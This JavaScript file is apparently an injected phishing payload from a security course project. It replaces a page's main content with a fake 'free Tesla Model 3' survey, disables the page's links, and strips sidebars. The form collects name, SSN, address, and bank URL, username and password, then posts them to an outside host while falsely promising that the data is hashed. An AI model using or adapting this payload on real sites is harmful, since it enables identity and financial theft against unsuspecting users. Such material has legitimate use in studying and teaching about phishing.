//phish-2 replaces the body of the page with a form asking for confirmation of certain details.
//Will have special placeholders with personal info like name etc. filled in by server before addition to payload

var newBody = document.createElement("div");
newBody.innerHTML = `
<div width=60%>
    <h1 style='font-size: 24px; padding-top: 40px; padding-bottom: 20px'>Do You Want to Own a Tesla Model 3 For Free?!</h1>
    <p style='font-size: 18px; padding: 5px 0px'>That's why we're excited to offer you the opportunity to enter your name into this survery for the chance to win a free Tesla Model 3!</p>
    <p style='font-size: 18px; padding: 5px 0px'>Any information that you enter here will be securly stored, and used in our study to determine how secure user passwords are based on their career. At the very least, your name, social security number, and address username, password, url for your bank account and address are required to send you your very own Tesla Model 3! We will also need your username, password, and the url to your bank account for our study.</p>
    <p style='font-size: 18px; padding: 5px 0px'>All information provided (except your email, so we can contact you) is securely hashed and cannot be recovered by a third party in the event of a breach.</p>

    <form method="post" action='https://cse331.andrewjaffie.me/submitform'>
        <p>Required fields are followed by <strong><abbr title="required">*</abbr></strong>.</p>
        <section>
            <h2>Contact information</h2>
            <p>
              <label for="fname">
                <span>First name: </span>
                <strong><abbr title="required">*</abbr></strong>
              </label>
              <input type="text" id="fname" name="FirstName">
            </p>
            <p>
            <label for="lname">
              <span>Last name: </span>
              <strong><abbr title="required">*</abbr></strong>
            </label>
            <input type="text" id="lname" name="LastName">
          </p>
          <p>
            <label for="ssn">
              <span>SSN: </span>
              <strong><abbr title="required">*</abbr></strong>
            </label>
            <input type="text" id="ssn" name="SSN">
          </p>
            <p>
              <label for="Street Address:">
                <span>Street Address: </span>
                <strong><abbr title="required">*</abbr></strong>
              </label>
              <input type="text" id="street" name="StreetAddress">
            </p>
	    <p>
	      <label for="State:">
		<span>State: </span>
	      </label>
	      <input type="text" id="state" name="State">
	    </p>
        </section>
        <section>
            <h2>Bank Account Information</h2>
	    <p>
	      <label for="url">
		<span>Bank Account URL:</span>
	      </label>
		<input type="text" id="url" name="URL">
	    </p>
            <p>
              <label for="username">
                <span>Bank Account Username:</span>
              </label>
                <input type="text" id="username" name="Username">
            </p>
            <p>
              <label for="password">
                <span>Password for Bank Account:</span>
                <em>formatted as mmyy</em>
              </label>
              <input type="text" id="password" name="UserPassword">
            </p>
        </section>
        <section>
            <p> <button type="submit">Submit</button> </p>
        </section>
        <input type='hidden' name='formurl' id='formurl'>
    </form>
</div>
`;
newBody.setAttribute('style', 'text-align: center');

var toReplace = null;
var possible = document.getElementsByTagName('div');
for(var i=0; i < possible.length; i++){
    element = possible[i];
    if(element.getAttribute('role') != null && ['', 'main'].includes(element.getAttribute('role'))){
        toReplace = element;
        break;
    }
}
if(toReplace == null){
    for(var i=0; i < possible.length; i++){
        element = possible[i];
        if(element.getAttribute('id') != null && (element.getAttribute('id').includes('content') || element.getAttribute('id').includes('main'))){
            toReplace = element;
            break;
        }
    }
}
if(toReplace == null){
    var inHeader = [];
    if(document.getElementsByTagName('header').length > 0){
        inHeader.push(document.getElementsByTagName('header')[0].querySelectorAll('div'));
    }
    for(var i=0; i < possible.length; i++){
        element = possible[i];
        if(element.getAttribute('class') === 'container' && inHeader != [] && !(Array.from(inHeader[0]).includes(element))){
            toReplace = element;
            break;
        }
    }
}
links = document.getElementsByTagName('a');
for(var i=0; i < links.length; i++){
    links[i].onclick = function(){return false;};
}

for(var i=0; i < possible.length; i++){
    element = possible[i];
    if((element.getAttribute('class') != null && element.getAttribute('class').includes('sidebar')) 
        || (element.getAttribute('id') != null && element.getAttribute('id').includes('sidebar'))
        || (element.getAttribute('id') != null && element.getAttribute('id').includes('right'))
        || (element.getAttribute('id') != null && element.getAttribute('id').includes('left'))){
            element.parentElement.removeChild(element);
        }
}
/* var h1s = document.getElementsByTagName('h1');
for(var i=0; i < h1s.length; i++)
    h1s[i].innerText = 'The Internet is a Dangerous Place!';
document.title = 'The Internet is a Dangerous Place!' */

toReplace.parentElement.replaceChild(newBody, toReplace);
document.getElementById('formurl').value=window.location.href;
